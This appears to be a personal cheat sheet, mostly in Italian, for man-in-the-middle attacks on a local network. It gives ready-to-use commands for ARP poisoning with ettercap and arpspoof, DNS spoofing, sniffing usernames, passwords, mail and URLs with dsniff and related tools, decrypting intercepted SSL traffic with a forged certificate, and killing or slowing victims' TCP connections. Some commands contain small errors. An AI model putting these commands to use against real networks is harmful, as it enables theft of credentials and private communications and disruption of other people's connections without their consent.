
-  man in the middle(mitm) sniffing


## sysctl

To displays all the output(parameters):
`sysctl -a`

To do changes with the appropriate command:
`sudo sysctl -w parameter=value`

For example:
`sudo sysctl -w net.ipv4.ip_forward=1`

To load the value into kernel and become live:
`sysctl -a`





## ettercap - mitm

Non c'è bisogno di abilitare l'inoltro ip ma basta semplicemente eseguire il comando
dopo la config di /etc/etter.conf

`sudo ettercap -Tqi wlan0 -M arp:remote /VICTIM/ /GW/`

ATTENZIONE: Non provare SSL utilizando il bridged mode in quanto non funziona.
ATTENZIONE: Non usare ip_forward=1 in quanto si rischierebbe di inviare duplicati(Vedere la descrizione di man ettercap per ulterior dettagli).
ATTENZIONE: Assicurarsi di avere installato iptables altrimenti non funzionerebbe il forward.

To check if ARP poison is working well try:
`arp -a`



## ettercap - dns_spoof

Modifica il file /usr/share/ettercap/etter.dns inserendo una regola del tipo:
* A 127.0.0.1 per inoltrare tutti i dns al localhost
Attivare il plugin dns_spoof


## ettercap - remote_browser

Serve per conoscere le pagine visitate dall'utente.
Specificare il browser da usare su /etc/etter.conf



## man in the middle (mitm)

Per abilitare l'inoltro dei pacchetti fare in questo modo (da non utilizzare con il comando fragrouter):
`echo 1 > /proc/sys/net/ipv4/ip-forward`

Se non funziona provare:
`sudo sysctl -w net.ipv4.ip_forward=0`


La prima operazione da fare è il comando arpspoof. Consideriamo i seguenti IP: IP_VICTIM è l'IP della vittima e IP_SERVER.
I comandi da eseguire sono:
`arpspoof -t IP_VICTIM IP_SERVER`
 e 
`arpspoof -t IP_SERVER IP_VICTIM`


La successiva operazione è fare in modo che il mitm possa inoltrare effettivamente i pacchetti in transito:
`fragrouter -B1`




## sniffing

Questa è un operazione che va fatta una volta che il pc è in mitm!!
Il comando capace di sniffare user e pass di moltissimi protocolli è:
`dsniff -i eth0 -md`

L'opzione -m consente il controllo automatico dei protocolli e -d è il debugging mode.
Un'altro comando che spesso viene adoperato è:
`ngrep host IP`

Dove IP è l'indirizzo IP della vittima.

Gli comandi di sniffing sono:
Sniffa mail e li pone in output ben formattati:
`mailsnarf`

Sniffa URL:
`urlsnarf`

Sniffa messaggi su IRC, MSN etc:
`msgsnarf`

Sniffa file su NFS:
`filesnarf`

Manda gli URL sniffati al proprio browser locale:
`webspy`




## SSL mitm

Questa è un operazione che va fatta una volta che il pc è in mitm!!
Questa procedura consente di ottenere falsificare i certificati che vengono trasmessi via HTTP, POP, SMTP o qualunque altro protocollo che si poggia sul SSL.
La prima operazione è redirezionare il traffico HTTP/HTTPS tramite:
`dnsspoof`

Successivamente occorre falsificare il certificato tramite il comando:
`webmitm`

A questo punto il comando webmitm restituirà il falso certificato (webmitm.crt) che potrà essere utilizzato per decifrare il traffico SSL sniffato tramite wireshark (ethereal) e posto in un file.
Quindi:
`ssldump -r ozzy -k webmitm.crt -d > outozzy`

con -r specifichiamo il dumpfile, -k è la chiave, -d indica di decifrare i dati
Rimane solo da interpretare i dati ormai decifrati:
`cat outozzy | grep ??`

In grep si può mettere qualcosa che possa filtrare i dati in modo da ottenere più facilmente i dati sensibili. Per esempio si può inserire il nome di qualche tag html vicino ai dati sensibili.




## kill and slow down connection with tcpkill and tcpnice

Se vogliamo chiudere le connessioni TCP su porta 22 (SSH):
`tcpkill -i eth0 tcp port 22`

If you want to kill all the connections but not for a pecified host:
`sudo tcpkill -i wlan0 -9 not host 192.168.1.109`

Se vogliamo rallentare una connessione TCP iniettando pacchetti che avvisano di una finestra di ricezione piccola o pacchetti ICMP:
`tcpnice -i eth0 tcp port 22`

To slow down all the connection but not for a specified host:
`sudo tcpnice -i wlan0 not host 192.168.1.109`




